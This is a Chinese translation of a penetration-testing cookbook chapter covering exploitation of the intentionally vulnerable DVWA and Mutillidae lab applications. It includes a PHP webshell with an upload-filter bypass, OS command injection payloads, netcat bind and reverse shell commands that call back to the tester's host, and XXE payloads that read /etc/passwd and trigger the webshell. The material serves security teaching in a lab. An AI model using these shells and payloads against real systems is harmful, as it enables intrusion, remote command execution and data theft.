# 第六章 利用 -- 低悬的果实

> 作者：Gilberto Najera-Gutierrez

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

## 简介

这章开始我们会开始涉及渗透测试的的利用层面。和漏洞评估的主要不同是，漏洞评估是测试者识别漏洞（多数时间使用自动化扫描器）和提出建议，关于如何减轻它们。而渗透测试是测试者作为而已攻击者并尝试利用检测到的漏洞，并得到最后的结果：整个系统的沦陷，访问内部网络，敏感数据泄露，以及其它。同时，要当心不要影响系统的可用性或者为真正的攻击者留下后门。

之前的章节中，我们已经涉及了如何检测 Web 应用中的一些漏洞。这一章中我们打算了解如何利用这些漏洞并使用它们来提取信息和获得应用及系统受限部分的访问权。

## 6.1 恶意使用文件包含和上传

我们在第四章中看到，文件包含漏洞在开发者对生成文件路径的输入校验不当，并使用该路径来包含源代码文件时出现。服务端语言的现代版本，例如 PHP 自 5.2.0 起，将一些特性默认关闭，例如远程文件包含，所以 2011 年起就不大可能找到 RFI 了。

这个秘籍中，我们会上传一些而已文件，其中之一是 Webshell（可用于在服务器中执行命令的页面），之后使用本地文件包含来执行它。

### 准备

这个秘籍中，我们会使用  vulnerable_vm  中的 DVWA ，并以中等安全级别配置，所以让我们将其配置起来。

1.  访问` http://192.168.56.102/dvwa`。

2.  登录。

3.  将安全级别设置为中。访问`DVWA Security`，在组合框中选择`medium`并点击`Submit`。

我们会上传一些文件给服务器，但是你需要记住它们储存在哪里，以便之后调用。所以，在 DVWA 中访问`Upload`并上传任何 JPG 图像。如果成功了，他会告诉你文件上传到了`../../hackable/uploads/`。现在我们知道了用于储存上传文件的相对路径。这对于秘籍就足够了。

我们也需要准备好我们的文件，所以让我们创建带有一下内容的文本文件：

```php
<? 
system($_GET['cmd']); 
echo '<form method="post" action="../../hackable/uploads/webshell. php"><input type="text" name="cmd"/></form>'; 
?>
```

将其保存为`webshell.php`。我们需要另一个文件，创建`rename.php`并输入下列代码：

```php
<? 
system('mv ../../hackable/uploads/webshell.jpg ../../hackable/uploads/ webshell.php'); 
?>
```

这个文件会接受特殊图像文件（`webshell.jpg`）并将其重命名为`webshell.php`。

### 操作步骤

1.  首先，让我们尝试上传我们的 webshell。在 DVWA 中访问`Upload`之后尝试上传`webshell.php`，像这样：

    ![](img/6-1-1.jpg)
    
    于是，这里对于我们能够上传的东西有个验证。这意味着我们需要上传图标文件，或更精确来说，带有`.jpg`，`.gif`或`.png`的图像文件。这就是为什么我们需要重命名脚本来还原原始文件的`.php`扩展，便于我们执行它。
    
2.  为了避免验证错误，我们需要将我们的 PHP 文件重命名为有效的扩展名。在终端中，我们需要访问 PHP 文件所在目录并创建它们的副本：

    ```
    cp rename.php rename.jpg 
    cp webshell.php webshell.jpg
    ```
    
3.  现在，让我们返回 DVWA 并尝试上传二者：

    ![](img/6-1-2.jpg)

4.  一旦两个 JPG 文件都上传了，我们使用本地文件包含漏洞过来执行`rename.jpg`。访问文件包含部分并利用这个漏洞来包含`../../hackable/uploads/rename.jpg`：

    ![](img/6-1-3.jpg)
    
    我们并没有得到这个文件执行的任何输出，我们需要假设`webshell.jpg `命名为`webshell.php`。
    
5.  如果它能工作，我们应该能够包含`../../hackable/uploads/ webshell.php`，让我们试试：

    ![](img/6-1-4.jpg)
    
6.  在左上角的文本框中，输入`/sbin/ifconfig`并按下回车：

    ![](img/6-1-5.jpg)
    
    并且它能够工作。就像图片中那样，服务器的 IP 是`192.168.56.102`。现在，我们可以在服务器中执行命令，通过将它们键入到文本框中，或者为`cmd`参数设置不同的值。
    
### 工作原理

在上传有效 JPG 文件时，我们所做的第一个测试是为了发现上传文件保存的路径。所以我们可以使用在`rename.php`中，以及表单的`action`中使用这个路径。

使用重命名脚本有两个重要原因：首先，上蔟韩页面只允许 JPG 文件，所以我们的脚本需要这个扩展名，其次，我们需要带参数调用我们的 webshell（要执行的命令），我们从 Web 服务器调用图片时不能带参数。

PHP 中的`system()`函数是攻击核心，它所做的是，执行系统命令并显式输出。这允许我们将 webshell 文件从`.jpg`重命名为`.php`文件并执行我们指定为 GET 参数的命令。

### 更多

一旦我们上传并执行了服务端代码，我们有很多选择来攻陷服务器，例如，下列代码可以在绑定的 shell 中调用：

```
nc -lp 12345 -e /bin/bash
```

它打开服务器的 TCP 12345 端口并监听连接。连接建立之后，它会将接收的信息作为输入来执行`/bin/bash`，并把输出通过网络发给被连接的主机（攻击者主机）。

也可以让服务器下载一些恶意程序，例如提权利用，执行它来获得更高权限。

## 6.2 利用 OS 命令注入

在上一个秘籍中，我们看到 PHP 的`system()`如何用于在服务器中执行 OS 命令。有时开发者使用类似于它的指令，或者相同的功能来执行一些人和，有时候他们会使用无效的用户输入作为参数来执行命令。

这个秘籍中，我们会利用命令注入漏洞并提取服务器中的重要信息。

### 操作步骤

1.  登录 DVWA 访问`Command Execution`。

2.  我们会看到` Ping for FREE `表单，试试它吧。Ping `192.168.56.1 `（在主机网络中，我们的 Kali Linux 的 IP）。

    ![](img/6-2-1.jpg)
    
    这个输出看起来像是直接的 ping 命令的输出。这表明服务器使用 OS 命令来执行 ping。所以它可能存在 OS 命令注入。
    
3.  让我们尝试注入一个非常简单的命令，提交下列代码：

    ```
    192.168.56.1;uname -a.
    ```
    
    ![](img/6-2-2.jpg)
    
    我们可以看到`uname`命令的输出就在 ping 的输出之后。这里存在命令注入漏洞。

4.  如果不带IP地址会怎么样呢：`;uname -a:`。

    ![](img/6-2-3.jpg)
    
5.  现在，我们打算获取服务端的反向 shell。首先我们必须确保服务器拥有所需的任何东西。提交下列代码：`;ls /bin/nc*`。

    ![](img/6-2-4.jpg)
    
    所以我们拥有多于一种版本的 Netcat，我们打算使用它来生成连接。`nc`的OpenBSD版本不支持执行连接命令，所以我们使用传统的版本。
    
6.  下一步是监听 Kali 主机的连接。打开终端并执行下列命令：

    ```
    nc -lp 1691 -v
    ```
    
7.  返回浏览器中，提交这个：`;nc.traditional -e /bin/bash 192.168.56.1 1691 &`。

    ![](img/6-2-5.jpg
    
    我们的终端会对连接做出反应。我们现在可以执行非交互式命令并检查它们的输出。
    
### 工作原理

就像 SQL 注入的例子那样，命令注入漏洞的原因是弱输入校验机制，以及使用用户提供的数据来拼接之后会用做 OS 命令的字符串。如果我们查看刚刚攻击的页面源代码（每个 DVWA 页面的右下角会有个按钮），会看到这些：

```php
<?php
if( isset( $_POST[ 'submit' ] ) ) {

    $target = $_REQUEST[ 'ip' ];
    
    // Determine OS and execute the ping command.    
    if (stristr(php_uname('s'), 'Windows NT')) {
        $cmd = shell_exec( 'ping  ' . $target );        
        echo '<pre>'.$cmd.'</pre>';            
        
    } else {             
        $cmd = shell_exec( 'ping  -c 3 ' . $target );        
        echo '<pre>'.$cmd.'</pre>';        
    }    
} 
?>
```

我们可以看到，它直接将用户的输入附加到 ping 命令后面。我们所做的仅仅是添加一个分号，系统的 shell 会将其解释为命令的分隔符，以及下一个我们打算执行的命令。

在成功执行命令之后，下一步就是验证服务器是否拥有 Netcat。它是一个能够建立网络连接的工具，在一些版本中还可以在新连接建立之后执行命令。我们看到了服务器的系统拥有两个不同版本的 Netcat，并执行了我们已知支持所需特性的版本。

之后我们配置攻击系统来监听 TCP 1691 端口连接（也可以是任何其它可用的 TCP 端口），然后我们让服务器连接到我们的机器，通过该端口并在连接建立时执行`/bin/bash`（系统 shell）。所以任何我们通过连接发送的东西都会被服务器接收作为 shell 的输入。

也可以让服务器下载一些恶意程序，例如提权利用，执行它来获得更高权限。

## 6.3 利用 XML 外部实体注入

XML 是主要用于描述文档或数据结构的格式，例如，HTML 是XML 的实现，它定义了页面和它们的关系的结构和格式。

XML 实体类似于定义在 XML 结构中的数据结构，它们中的一些能够从文件系统中读取文件或者甚至是执行命令。

这个秘籍中，我们会利用 XML 外部实体注入漏洞来在服务器中执行代码。

### 准备

建议你开始之前遵循上一个秘籍中的步骤。

### 操作步骤

1.  浏览`http://192.168.56.102/mutillidae/index.php?page=xmlvalidator.php`。

2.  上面写着它是个 XML 校验器。让我们尝试提交测试示例来观察发生什么。在 XML 输入框中，输入` <somexml><message>Hello World</message></ somexml>`，并点击` Validate XML`。

    ![](img/6-3-1.jpg)
    
3.  现在让我们观察它是否正确处理了实体，提交系列代码：

    ```xml
    <!DOCTYPE person [  
        <!ELEMENT person ANY>  
        <!ENTITY person "Mr Bob"> 
    ]> 
    <somexml><message>Hello World &person;</message></somexml>
    ```
    
    ![](img/6-3-2.jpg)
    
    这里，我们仅仅定义了实体并将值`"Mr Bob" `赋给它。解析器在展示结果时解释了实体并替换了它的值。
    
4.  这就是内部实体的使用，让我们尝试外部实体：

    ```xml
    <!DOCTYPE fileEntity [  
        <!ELEMENT fileEntity ANY>  
        <!ENTITY fileEntity SYSTEM "file:///etc/passwd"> 
    ]> 
    <somexml><message>Hello World &fileEntity;</message></somexml>
    ```
    
    ![](img/6-3-3.jpg)
    
    使用这个技巧，我们就可以提取系统中的任何文件，只要它们可以在 Web 服务器的运行环境被用户读取。
    
    我们也可以使用 XEE 来加载页面。在上一个秘籍中，我们已经设法将 webshell 上传到服务器中，让我们试试吧。
    
    ```xml
    <!DOCTYPE fileEntity [ 
        <!ELEMENT fileEntity ANY> 
        <!ENTITY fileEntity SYSTEM "http://192.168.56.102/dvwa/hackable/uploads/ webshell.php?cmd=/sbin/ifconfig"> 
    ]> 
    <somexml><message>Hello World &fileEntity;</message></somexml>
    ```
    
    ![](img/6-3-4.jpg)
    
### 工作原理

XML 拥有叫做实体的特性。XML 实体是与值关联的名称，每次实体在文档汇总使用的时候，他都会在 XML文件处理时替换为值。使用它以及不同的可用包装器（`file://`来加载系统文件，或者`http://`来加载 URL），我们就可以通过输入校验和XML 解析器的配置，恶意使用没有合理安全措施的实现，而并提取敏感数据或者甚至在服务器中执行系统命令。

这个秘籍中，我们使用`file://`包装器来使解析器加载服务器中的任意文件，之后，使用`http://`包装器，我们调用了网页，它碰巧是同一个服务器中的 webshell，并执行了一些命令。

### 更多

这个漏洞也可以用于发起 DoS 攻击，叫做“Billion laughs”，你可以在维基百科中阅读更多信息：` https://en.wikipedia.org/wiki/Billion_laughs `。

PHP 也支持不同的 XML 实体包装器（类似于`file://`和`http://`），如果它在服务器中被开启，也会在不需要上传文件的情况下允许命令执行，它就是`expect://`。你可以在这里找到更多它和其它包装器的信息：`http://www.php.net/manual/en/wrappers.php`。

### 另见

XXE 漏洞如何在世界上最流行的站点上发现的例子，可以在这里查看：`http://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution`。
